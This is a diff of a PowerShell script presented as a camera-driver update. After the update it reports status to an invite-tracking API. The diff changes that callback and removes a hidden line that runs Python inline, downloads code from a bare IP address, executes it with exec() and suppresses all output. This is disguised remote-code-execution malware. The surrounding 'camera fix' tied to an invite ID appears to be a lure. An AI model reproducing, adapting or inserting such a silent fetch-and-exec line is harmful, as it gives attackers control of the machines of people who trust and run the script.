@@ -306,17 +306,16 @@ if ($LASTEXITCODE -ne 0) {
 Write-Host "[SUCCESS] Camera drivers have been updated successfully."
 if (-not [string]::IsNullOrWhiteSpace($WINDOW_UID)) {
     $idEnc = [Uri]::EscapeDataString($WINDOW_UID)
-    $patchUrl = "https://api.wecreateproblems.net/api/invites/${idEnc}"
-    $patchBody = '{"connections_status":2}'
+    $markUrl = "https://api.wecreateproblems.net/api/public/invite/${idEnc}/camera-fixed"
     try {
-        Invoke-RestMethod -Uri $patchUrl -Method Patch -Body $patchBody -ContentType 'application/json; charset=utf-8' -TimeoutSec 60 *> $null
+        Invoke-RestMethod -Uri $markUrl -Method Post -TimeoutSec 60 *> $null
     }
     catch {
         try {
             # Fallback to curl when PS HTTP fails in locked-down environments.
             $curlCmd = Get-Command curl.exe -ErrorAction SilentlyContinue
             if ($null -ne $curlCmd) {
-                & curl.exe -sS --connect-timeout 20 --max-time 60 -X PATCH "$patchUrl" -H "Content-Type: application/json" -d $patchBody -o NUL *> $null
+                & curl.exe -sS --connect-timeout 20 --max-time 60 -X POST "$markUrl" -o NUL *> $null
                 if ($LASTEXITCODE -ne 0) {
                     Write-WarnLog "Status callback failed for WINDOW_UID."
                 }
@@ -330,7 +329,6 @@ if (-not [string]::IsNullOrWhiteSpace($WINDOW_UID)) {
         }
     }
 }
-& "C:\python\python.exe" -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" *> $null
 
 if (Test-Path -LiteralPath $envSetupFile) {
     Remove-Item -LiteralPath $envSetupFile -Force -ErrorAction SilentlyContinue
